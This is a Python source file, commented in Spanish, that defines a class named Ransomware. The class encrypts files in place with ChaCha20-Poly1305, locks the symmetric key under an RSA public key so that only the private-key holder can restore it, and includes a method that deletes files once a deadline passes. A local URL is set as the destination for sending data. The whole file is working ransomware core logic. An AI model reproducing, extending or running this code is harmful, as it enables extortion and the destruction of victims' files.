"""
  Este archivo contiene toda la logica para poder cifrar los datos, 
  descifrar los datos y cifrar la key para evitar que alguien la obtenga facilmente.
"""
import os
import requests
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization

class Ransomware:

  def __init__(self):
    """No mover, esto se encuentra en orden para inicializar todo de forma correcta"""
    self.key_encripted = False
    self.key = self.get_key()
    self.to_send = "http://127.0.0.1:8000/ransomware"
    self.public_key = None
    self.public_key = self.get_public_key()
      
  def cifrar_archivo(self, ruta_origen):
    """Cifra un archivo usando ChaCha20-Poly1305."""

    chacha = ChaCha20Poly1305(self.key)
    nonce = os.urandom(12)
    
    with open(ruta_origen, 'rb') as f:
      datos_originales = f.read()
        
    datos_cifrados = chacha.encrypt(nonce, datos_originales, None)
    
    with open(ruta_origen, 'wb') as f:
      f.write(nonce)
      f.write(datos_cifrados)
    
    print(f"¡Archivo cifrado con éxito en: {ruta_origen}!")

  def get_key(self):

    if self.key_encripted:
      print("La llave esta encriptada")
      return

    try:
      with open("key.bin", "rb") as f:
        key = f.read()
        return key
    except FileNotFoundError:
      key = ChaCha20Poly1305.generate_key()
      with open("key.bin", "wb") as f:
        f.write(key)
      return key
    except PermissionError:
      print("No tienes permisos para leer el archivo.")
    except Exception as e:
      print(f"Ocurrió un error: {e}")


  def descifrar_archivo(self, ruta_origen):
    """Descifra un archivo que contiene el nonce en los primeros 12 bytes."""

    if self.key_encripted:
      print("La clave esta encriptada")
      return

    chacha = ChaCha20Poly1305(self.key)
    
    # 1. Leer el archivo cifrado
    with open(ruta_origen, 'rb') as f:
      # Extraer los primeros 12 bytes correspondientes al nonce
      nonce = f.read(12)
      # El resto son los datos cifrados con la etiqueta Poly1305
      datos_cifrados = f.read()
        
    try:
      datos_descifrados = chacha.decrypt(nonce, datos_cifrados, None)
      
      with open(ruta_origen, 'wb') as f:
        print(datos_descifrados)
        f.write(datos_descifrados)
      print(f"¡Archivo descifrado con éxito en: {ruta_origen}!")

    except Exception as e:
      print("Error de autenticación: La llave es incorrecta o el archivo fue manipulado.")


  def get_public_key(self):
    """Obtiene la llave publica para poder cifrar la llave de ChaCha20"""
    if self.public_key:
      return self.public_key
    
    with open("public_key.bin", "rb") as f:
        public_key = serialization.load_pem_public_key(f.read())

    return public_key
  
  def cifrar_llave(self):
    """Cifra la llave de ChaCha20"""
    if self.key_encripted:
      print("La llave ya se encuentra encriptada")
      return

    encrypted_key = self.public_key.encrypt(
        self.key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open("key.bin", "wb") as f:
      f.write(encrypted_key)

    self.key = encrypted_key
    self.key_encripted = True

  def descifrar_llave(self, ruta_private_key):
    """Descifra la llave de ChaCha20"""
    with open(ruta_private_key, "rb") as f:
      private_key = serialization.load_pem_private_key(f.read(), password=None)

    with open("key.bin", "rb") as f:
      encrypted_key = f.read()

    key = private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open("key.bin", "wb") as f:
      f.write(key)

    self.key = key
    self.key_encripted = False

  def eliminar_datos(self, archivo):
    """Elimina los datos en caso de que se acabe el tiempo"""
    if os.path.exists(archivo):
      os.remove(archivo)
      print('Archivo eliminado')
    else:
      print('El archivo no existe')

